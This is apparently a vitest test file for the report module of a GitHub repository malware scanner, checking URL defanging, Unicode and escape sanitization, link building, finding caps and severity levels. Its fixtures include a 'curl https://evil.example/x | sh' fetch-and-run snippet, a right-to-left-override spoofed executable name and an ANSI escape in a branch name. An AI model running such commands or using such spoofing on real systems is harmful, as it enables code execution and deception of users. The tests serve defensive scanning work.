import { describe, expect, it } from "vitest";

import { MAX_FINDINGS_PER_RULE, toReport } from "../src/engine/report";
import type { Finding, RepoInfo, ScanResult } from "../src/engine/types";
import { emptyStats } from "../src/engine/types";
import { SHA } from "./helpers";

const RLO = String.fromCodePoint(0x202e);

const info: RepoInfo = {
  fullName: "octo/demo",
  description: `Visit https://evil.example ${RLO}now`,
  sizeKb: 1,
  createdAt: "2020-01-01T00:00:00Z",
  pushedAt: null,
  defaultBranch: "main\x1b[31m",
  headSha: SHA,
  stars: 1,
  forks: 0,
  isFork: false,
  archived: false,
  ownerLogin: "octo",
  ownerType: "User",
  ownerCreatedAt: null,
  releaseAssets: [
    { releaseTag: "v1", name: "tool.zip", size: 1, digest: `sha256:${"ab".repeat(32)}` },
    { releaseTag: "v1", name: "x.exe", size: 1, digest: "sha256:not-hex" },
    { releaseTag: "v1", name: "y.exe", size: 1, digest: null },
  ],
};

function finding(over: Partial<Finding> = {}): Finding {
  return {
    ruleId: "GR-CODE-002",
    title: "t",
    category: "code",
    path: "dir/my file#1.sh",
    line: 3,
    snippet: "curl https://evil.example/x | sh",
    why: "w",
    weight: 35,
    docContext: false,
    note: null,
    ...over,
  };
}

function result(findings: Finding[]): ScanResult {
  return {
    repo: info,
    findings,
    score: 35,
    verdict: "suspicious",
    ruleScores: { "GR-CODE-002": 35 },
    stats: emptyStats(),
    partial: null,
    archiveCheck: { status: "ok", hidden: 0, scanned: 0 },
    dependencyCheck: { status: "none", packages: 0, malicious: 0 },
    testFilesCapped: false,
    submodules: [],
    reputationCheck: { status: "none", files: [], notLookedUp: 0 },
    rulesRun: ["GR-CODE-002"],
    startedAt: "2026-10-01T00:00:00.000Z",
    durationMs: 5,
  };
}

describe("toReport", () => {
  it("sanitizes every repository-controlled string", () => {
    const r = toReport(result([finding({ path: `evil${RLO}gpj.exe`, note: "see https://x.example" })]));
    expect(r.target?.description).toBe("Visit hxxps://evil[.]example [U+202E]now");
    expect(r.target?.defaultBranch).toBe("main[U+001B][31m");
    expect(r.findings[0].path).toBe("evil[U+202E]gpj.exe");
    expect(r.findings[0].note).toBe("see hxxps://x[.]example");
    expect(JSON.stringify(r)).not.toContain(RLO);
  });

  it("builds GitHub line links from validated, encoded parts", () => {
    const r = toReport(result([finding()]));
    expect(r.findings[0].githubUrl).toBe(`https://github.com/octo/demo/blob/${SHA}/dir/my%20file%231.sh#L3`);
    expect(r.target?.url).toBe("https://github.com/octo/demo");
  });

  it("links to VirusTotal only for valid sha256 digests", () => {
    const r = toReport(result([]));
    expect(r.releaseAssets.map((a) => a.virusTotalUrl)).toEqual([
      `https://www.virustotal.com/gui/file/${"ab".repeat(32)}`,
      null,
      null,
    ]);
  });

  it("keeps the strongest findings and counts the rest", () => {
    const many = Array.from({ length: MAX_FINDINGS_PER_RULE + 10 }, (_, i) => finding({ line: i + 1, weight: i === 49 ? 40 : 35 }));
    const r = toReport(result(many));
    expect(r.findings).toHaveLength(MAX_FINDINGS_PER_RULE);
    expect(r.omittedFindings).toBe(10);
    expect(r.findings[0].weight).toBe(40);
    expect(r.rules[0]).toMatchObject({ id: "GR-CODE-002", points: 35, findings: MAX_FINDINGS_PER_RULE + 10 });
  });

  it("assigns severities from weights", () => {
    const r = toReport(result([finding({ weight: 45 }), finding({ weight: 20, line: 9 }), finding({ weight: 5, line: 10 })]));
    expect(r.findings.map((f) => f.severity)).toEqual(["high", "medium", "low"]);
  });
});
